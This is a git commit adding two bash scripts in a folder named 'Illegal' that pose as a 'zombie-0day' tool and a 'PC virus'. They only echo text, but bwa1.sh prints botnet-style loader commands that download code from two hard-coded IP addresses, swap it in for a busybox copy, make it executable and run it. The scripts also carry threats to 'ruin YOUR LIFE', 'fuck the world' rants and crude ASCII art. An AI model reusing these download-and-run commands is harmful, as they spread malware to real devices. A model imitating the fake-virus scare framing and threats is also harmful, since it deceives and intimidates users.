4a5a37e5c129f68342825b981957f85bd75ee29c
UG-1vFiayb <holtuksss@gmail.com>
2017-05-13 01:38:11 -0500

    Add files via upload

---
+++ Illegal/bwa1.sh
@@ -0,0 +1,40 @@
+#! /bin/bash
+echo -e "\e[1;35m### Unleashing Shenron Power ###\e[0m" 
+sleep 5;
+echo -e "\e[0;36m ; S H E N R O N S E L F U P D A T E  ; \e[0m"
+echo -e "\e[0;36m ; - - - - - - - - - - - - - - - - -  ; \e[0m"
+sleep 3;
+echo -e "\e[1;35m ; - - - - - - - - - - - - - - - - -  ; \e[0m"
+echo -e "\e[1;35m ; - - - - - - - - - - - - - - - - -  ; \e[0m"
+sleep 3;
+echo -e "\033[31m ; Shenron Has Been Awoken ;"
+echo -e "\033[31m ;     Im Fucking Gay      ;"
+sleep 2;
+echo -e "\x1B[01;95m Currently Scanning For All New Connections Curled... \x1B[0;94m"
+sleep 1;
+echo -e "\x1B[96m $ All Updated have been curled...102918 New Connections Recorded...\x1B[0m"
+sleep 0.5;
+echo -e "\e[0;34m $ host;\\DOGDICKS>>+; $morph-Output(cd%f46a7xa) \e[0m"
+sleep 0.5;
+echo -e "\x1B[01;91m $ http://80.82.65.153/sh; cp /bin/busybox ./; cat sh > busybox; rm sh; cp busybox sh; rm busybox; ./sh \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[01;95m $ Re-formatting...  \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[32m ; - - - - - - - - - - - - - - - - -  ; \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[32m ; - - - - - - - - - - - - - - - - -  ; \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[31m $ http://185.62.189.239/doggydickssh4 && chmod +x doggydickssh4 \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[32m ; - - - - - - - - - - - - - - - - -  ; \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[32m ; - - - - - - - - - - - - - - - - -  ; \x1B[0m"
+sleep 0.5;
+echo -e "\x1B[32m This tool is one of the most powerful zombie-0dai(s) out there, \x1B[0m"
+echo -e "\x1B[32m Do NOT use this tool for malevolent usage, unless absolutely needed, \x1B[0m"
+echo -e "\x1B[32m Program coded by BWA KingOren, Don't leak my code, I will find out who did \x1B[0m"
+echo -e "\x1B[32m And ruin YOUR LIFE, Do NOT test me. \x1B[0m"
+sleep 3;
+echo -e "\e[96 usage: >> bash theend.sh site login KingOren \x1B[0m"
+
+
---
+++ Illegal/bwa2.sh
@@ -0,0 +1,69 @@
+#! /bin/bash
+echo -e "\e[91m ### Welcome to the most powerful PC virus ###\e[0m" 
+sleep 5;
+echo -e "\e[91m _|___|___|___|___|___|___|___|___|___| \e[0m"
+sleep 0.5;
+echo -e "\e[91m ___|___|___|___|___|___|___|___|___|__ \e[0m"
+sleep 0.5;
+echo -e "\e[91m _|___|___|___|___|___|___|___|___|___| \e[0m"
+sleep 0.5;
+echo -e "\e[91m ___|___|___|___|___|___|___|___|___|__ \e[0m"
+sleep 0.5;
+echo -e "\e[91m _|___|___|___|___|___|___|___|___|___| \e[0m"
+sleep 2;
+echo -e "\e[1;35m $Scanning for PGP-MERF94 Key Phrase... \e[0m"
+sleep 3;
+echo -e "\033[31m ; ... ... ... ... ... ... ... ... ... \e[0m"
+echo -e "\033[31m ; ... ... ... ... ... ... ... ... ... \e[0m"
+echo -e "\x1B[01;95m ; Verification Successful...  \e[0m"
+sleep 2;
+echo -e "\x1B[01;95m $This is your last chance to quit this program$ \x1B[0;94m"
+sleep 1;
+echo -e "\x1B[96m $Press \e[0;34m ENTER \x1B[96m to continue, or \e[0;34m ESCAPE \x1B[96m to quit$ \x1B[0m"
+sleep 1;
+echo -e "\e[91m WELCOME TO HELL BROUGHT TO YOU BY KINGOREN - FUCK THE WORLD \e[0m"
+sleep 1;
+echo -e "\e[91m YOU'RE ALL TO BLAME, I HOPE YOU'RE HAPPY YOU CAUSED THIS \e[0m"
+sleep 1;
+echo -e "\e[91m  \e[0m"
+sleep 2:
+echo -e "\e[94m $                                            .""--..__
+                     _                     []       ``-.._
+                  .'` `'.                  ||__           `-._
+                 /    ,-.\                 ||_ ```---..__     `-.
+                /    /:::\\               /|//}          ``--._  `.
+                |    |:::||              |////}                `-. \
+                |    |:::||             //'///                    `.\
+                |    |:::||            //  ||'                      `|
+        666     /    |:::|/        _,-//\  ||
+        KO     /`    |:::|`-,__,-'`  |/  \ ||
+             /`  |   |'' ||           \   |||
+           /`    \   |   ||            |  /||
+         |`       |  |   |)            \ | ||
+        |          \ |   /      ,.__    \| ||
+        /           `         /`    `\   | ||
+       |                     /        \  / ||
+       |                     |        | /  ||
+       /         /           |        `(   ||
+      /          .           /          )  ||
+     |            \          |     ________||
+    /             |          /     `-------.|
+   |\            /          |              ||
+   \/`-._       |           /              ||
+    //   `.    /`           |              ||
+   //`.    `. |             \              ||
+  ///\ `-._  )/             |              ||
+ //// )   .(/               |              ||
+ ||||   ,'` )               /              //
+ ||||  /                    /             || 
+ `\\` /`                    |             // 
+     |`                     \            ||  
+    /                        |           //  
+  /`                          \         //   
+/`                            |        ||    
+`-.___,-.      .-.        ___,'        (/    
+         `---'`   `'----'` \e[0m"
+sleep 5;
+echo -e "\e[96 usage: >> bash theend.sh site retrieval:offline:scan KingOren \x1B[0m"
+
+
